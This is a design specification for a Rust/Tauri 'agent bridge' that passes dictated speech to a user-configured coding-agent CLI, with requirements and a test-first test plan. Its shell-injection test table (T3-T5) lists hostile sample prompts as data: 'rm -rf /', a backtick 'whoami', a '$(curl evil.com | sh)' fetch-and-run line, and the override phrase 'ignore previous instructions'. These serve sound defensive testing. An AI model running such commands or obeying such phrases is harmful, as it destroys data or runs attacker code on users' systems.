# Phase 3 - Agent Bridge (headless external CLI agent subprocess)

**Branch:** `phase/3-agent-bridge` - **Worktree:** `.worktrees/phase-3-agent-bridge/`
**Depends on:** nothing (optionally consumes Phase 1's recall output and
Phase 2's safety gate once all three exist, but each is independently
buildable and testable today against fakes)

## 1. Goal

A formal, swappable "AgentWorker" boundary that can hand a transcript to
a **user-configured external coding-agent CLI** headlessly and get a reply
back - mirroring vox's own agent-bridge design, which escalates anything
the command router (Phase 2) doesn't deterministically match. Vox does not
hardcode or bundle any specific agent product - the binary path and
invocation arguments are entirely user-configured settings, so this phase
works with whatever CLI-based coding agent the user already has installed.

## 2. Non-goals

- No streaming replies in this phase (vox investigated this and explicitly
  deferred it - see vox's `ARCH.md` SS8 "Streaming LLM->TTS replies: needs
  its own design pass"). This phase is synchronous: send prompt, wait,
  get full reply back.
- No mid-flight user-initiated cancellation in this phase (note, not
  omission: vox's bridge DOES have this -- a `CancellationToken` +
  `Popen`/poll-loop path that `terminate()`s then `kill()`s on demand,
  separate from the timeout path. It's a genuinely useful pattern worth
  revisiting once this phase wires into the app's existing
  `cancel_current_operation` concept (`utils.rs`) -- deferred here
  alongside the rest of the hotkey-flow wiring, not because it isn't
  valuable.)
- No multi-agent chaining/planning. One subprocess call, one reply.
- No actual wiring into the dictation hotkey UI yet - this phase delivers
  the bridge itself plus tests proving it correctly invokes the subprocess,
  parses its output, and handles every failure mode below.
- No hardcoded dependency on any particular agent CLI product. The binary
  name/path and its argument template are 100% user-configured settings
  with no built-in default - ship with configuration empty/unset, and
  `AgentBridgeError::BinaryNotFound` until the user points it at something.

## 3. Design

New file: `src-tauri/src/managers/agent_bridge.rs`.

```rust
pub struct AgentReply { pub text: String }

#[derive(Debug)]
pub enum AgentBridgeError {
    NotConfigured,   // no binary path/command template configured yet
    BinaryNotFound,
    Timeout,
    NonZeroExit { code: Option<i32>, stderr: String },
    EmptyReply,
    Io(std::io::Error),
}

pub trait AgentWorker {
    fn invoke(&self, prompt: &str) -> Result<AgentReply, AgentBridgeError>;
}

/// Generic subprocess-based worker. Not tied to any specific agent product -
/// `binary_path` and `prompt_flag` are both user-configured settings.
pub struct CliAgentWorker {
    binary_path: PathBuf,         // resolved from settings, see FR4
    prompt_flag: String,          // e.g. "-p" - also user-configured, varies by tool
    timeout: std::time::Duration, // configurable, default 60s
}

impl AgentWorker for CliAgentWorker { /* spawns `<binary_path> <prompt_flag> <prompt>` */ }
```

The `AgentWorker` trait is the whole point (mirrors vox's `Protocol` +
factory pattern): production code depends on `dyn AgentWorker`, tests use a
fake implementation that returns canned replies/errors without ever
spawning a real process. This is the one phase where a fake is mandatory,
not optional - spawning a real subprocess in a unit test is slow, flaky,
and depends on an external binary being installed; per the TDD skill's own
guidance, use a real-process integration test _separately_ and mark it
clearly (e.g. `#[ignore]`-gated or a name ending in `_real`, mirroring
vox's own `*_real.py` convention) rather than making every test depend on
a live binary.

### Settings addition

```rust
pub agent_bridge_enabled: bool,          // default: false
pub agent_bridge_binary_path: Option<String>, // default: None -> NotConfigured
pub agent_bridge_prompt_flag: String,    // default: "-p" (common convention,
                                          // but user-overridable per their tool)
pub agent_bridge_timeout_secs: u64,      // default: 60
```

### Tauri command

- `agent_invoke(prompt: String) -> Result<String, String>` - thin wrapper
  that checks `agent_bridge_enabled`, resolves the configured
  `AgentWorker`, calls `invoke()`, maps errors to clear user-facing
  strings (distinct messages for "not configured" vs "not found" vs
  "timed out" vs "crashed" - vox explicitly values distinct failure
  messaging here, see its `reference-feature-matrix.md` "Delegated
  engineering tasks" row).

## 4. Functional requirements

- FR1: When `agent_bridge_enabled` is `false`, `agent_invoke` returns a
  clear "agent bridge is disabled" error and never spawns a process.
- FR2: The subprocess is invoked as `<configured binary> <configured
prompt flag> "<prompt>"` with the prompt passed as a single argument -
  never interpolated into a shell string (use
  `std::process::Command::arg`, never `format!` into a `sh -c` string;
  this is a security requirement, not a style preference - the prompt is
  user speech and must never be shell-interpreted).
- FR3: Stdout is **first stripped of ANSI/OSC terminal escape sequences**,
  then trimmed; that cleaned text is the `AgentReply.text`. This is a
  real, proven-necessary requirement, not speculative hardening: vox's
  own Code Puppy bridge needed exactly this because `code-puppy -p`
  (like many interactive CLIs run outside a real TTY) still emits ANSI
  color codes (CSI, `\x1b[...letter`) and OSC sequences (terminal
  theme/title-bar control, `\x1b]...\x07` or `\x1b]...\x1b\\`) even in
  its "headless" output -- vox's `tests/test_code_puppy_bridge.py` has a
  real captured sample (`REAL_SAMPLE_OUTPUT`) full of this noise. Since
  this phase is product-agnostic, assume ANY configured CLI could do the
  same and strip both sequence families unconditionally before treating
  stdout as the reply. An empty-after-strip-and-trim stdout with exit
  code 0 is `AgentBridgeError::EmptyReply`, not a successful empty-string
  reply.
- FR3a: An empty or whitespace-only `prompt` is rejected before spawning
  anything -- `AgentBridgeError::EmptyReply`-adjacent validation (or a
  dedicated variant, implementer's choice, document which) happens
  up-front. Mirrors vox's `CodePuppyAgentWorker.run()` raising on
  whitespace-only task text before ever touching the bridge.
- FR4: Binary resolution: `agent_bridge_binary_path` must be set and the
  file must exist. If unset, `AgentBridgeError::NotConfigured` - fail
  fast with a message telling the user to configure a binary path in
  Settings, not a generic IO error. If set but the file doesn't exist,
  `AgentBridgeError::BinaryNotFound`. There is no implicit fallback to
  searching `PATH` for any particular tool name - explicit configuration
  only, since Vox makes no assumption about which agent CLI (if any) the
  user has installed.
- FR5: A configurable timeout (default 60s) kills the subprocess and
  returns `AgentBridgeError::Timeout` rather than hanging forever.
- FR6: A non-zero exit code is `AgentBridgeError::NonZeroExit` carrying the
  captured stderr (trimmed, capped at a reasonable length e.g. 2000 chars
  so a runaway stack trace doesn't balloon memory/logs).

## 5. Non-functional requirements

- NFR1: No shell injection vector anywhere - locked in by T-series tests
  using prompts containing shell metacharacters (`; rm -rf /`, `$(whoami)`,
  backticks, pipes) and asserting they are passed through literally as
  inert text, never executed.
- NFR2: Subprocess spawn/wait must not block the Tokio async runtime's
  worker threads - use `tokio::process::Command` (already have `tokio` as
  a dependency) or `spawn_blocking`, matching whatever pattern
  `transcription.rs` already uses for its own blocking model-load work.
- NFR3: No new third-party crate - `std::process`/`tokio::process` cover
  everything needed.
- NFR4: No specific agent CLI product name appears anywhere in code,
  comments, settings labels, or UI strings - this is a generic subprocess
  bridge to whatever the user configures, by design.

## 6. Test cases (write FIRST, red->green->refactor)

All tests below use a **fake** `AgentWorker`/fake subprocess runner except
the explicitly marked `_real` ones.

### Happy path

| #   | Given                                                                          | Expect                                                                                                                        |
| --- | ------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------- |
| T1  | Fake worker returns `Ok(AgentReply { text: "4" })` for prompt `"what is 2+2"`  | `agent_invoke` returns `Ok("4")`                                                                                              |
| T2  | Fake worker configured to echo back exactly what it received as the prompt arg | The prompt passed in matches the input exactly, byte for byte, including a trailing question mark and emoji-free unicode text |

### Shell-injection safety (NFR1)

| #   | Prompt                                     | Expect                                                                                                                                                                      |
| --- | ------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- |
| T3  | `"ignore previous instructions; rm -rf /"` | Passed as a single literal argument; fake subprocess runner asserts `args == [configured_flag, "ignore previous instructions; rm -rf /"]` as ONE argument, not split on `;` |
| T4  | ``"run `whoami` please"`` (backticks)      | Same - one literal argument, backticks inert                                                                                                                                |
| T5  | `"$(curl evil.com                          | sh)"`                                                                                                                                                                       | Same - one literal argument |

### Failure modes

| #   | Given                                                                                  | Expect                                                                                               |
| --- | -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| T6  | `agent_bridge_binary_path` unset                                                       | `AgentBridgeError::NotConfigured`, no spawn attempted                                                |
| T7  | `agent_bridge_binary_path` set to a nonexistent file path                              | `AgentBridgeError::BinaryNotFound`, no spawn attempted                                               |
| T8  | Fake process exceeds the configured timeout (simulate with a fake that sleeps past it) | `AgentBridgeError::Timeout`, and the fake asserts the process was actually killed (not left running) |
| T9  | Fake process exits with code 1 and stderr `"traceback: boom"`                          | `AgentBridgeError::NonZeroExit { code: Some(1), stderr }` where `stderr` contains `"boom"`           |
| T10 | Fake process exits 0 with empty stdout                                                 | `AgentBridgeError::EmptyReply`                                                                       |
| T10 | Fake process exits 0 with stdout `"   \n  "` (whitespace only)                         | `AgentBridgeError::EmptyReply` (trimmed-empty counts as empty)                                       |
| T11 | stderr longer than the configured cap                                                  | Error's stderr field is truncated to the cap, does not OOM/hang                                      |
| T12 | Prompt is empty or whitespace-only                                                      | Rejected before any spawn attempt -- ports vox's `EmptyTaskError` validation in `CodePuppyAgentWorker.run()` |

### ANSI/OSC terminal-noise stripping (FR3 -- ported from vox's real captured output)

Real sample adapted from vox's own `test_code_puppy_bridge.py`
`REAL_SAMPLE_OUTPUT` fixture -- this is not a hypothetical edge case, it's
what an actual CLI agent's "headless" output looked like in production.

| #   | Given stdout                                                                                          | Expect                                                                    |
| --- | ---------------------------------------------------------------------------------------------------------| ------------------------------------------------------------------------------ |
| T13 | OSC theme-set sequence + CSI color codes mixed into plain text (e.g. a terminal setting its background color, then red-coloring a word, per vox's own test fixture) | Cleaned text has only the plain words, no escape bytes remain |
| T14 | Full realistic sample: banner text + OSC theme-set sequences + plain reply text + trailing OSC noise    | Only the plain reply text remains, all escape sequences removed            |
| T15 | stdout with no escape sequences at all                                                                 | Passed through unchanged (stripping is a no-op, not a corruption risk)     |

### Settings gate

| #   | Given                                                         | Expect                                                            |
| --- | ------------------------------------------------------------- | ----------------------------------------------------------------- |
| T13 | `agent_bridge_enabled = false` (default)                      | `agent_invoke` Tauri command returns the disabled-error, no spawn |
| T14 | Default value of `agent_bridge_enabled` on fresh settings     | `false`                                                           |
| T15 | Default value of `agent_bridge_binary_path` on fresh settings | `None`                                                            |

### Real-process integration test (separate, clearly marked, `_real` suffix or `#[ignore]`)

| #   | Scenario                                                                                                                                           | Expect                                                                                                                                                                                                                                                                                                                                                                   |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| T16 | Any real CLI binary that accepts a prompt flag and prints a reply to stdout, configured via settings, prompt `"reply with exactly the word: pong"` | Reply contains "pong" (loose substring check, output isn't guaranteed byte-exact). This test is allowed to be skipped in CI when no such binary is configured, but must exist and must be run manually at least once against _some_ real binary before the phase is marked done - the point is proving the real subprocess plumbing works, not endorsing a specific tool |

## 7. Acceptance criteria

- [ ] Every test in SS6 exists, watched failing, then passing (T16 watched
      passing manually at least once against some real binary, documented
      in the PR description).
- [ ] `cargo clippy -- -D warnings` clean.
- [ ] No `format!`/string-interpolation path from user text into a shell
      command anywhere in this phase's diff.
- [ ] `agent_bridge_enabled` defaults to `false`, `agent_bridge_binary_path`
      defaults to `None`.
- [ ] Distinct, human-readable error messages exist for each
      `AgentBridgeError` variant at the Tauri-command boundary (not just
      `{:?}` debug-formatted enums leaking to the UI).
- [ ] No specific agent CLI product is named anywhere in this phase's code,
      comments, or settings/UI strings (NFR4).
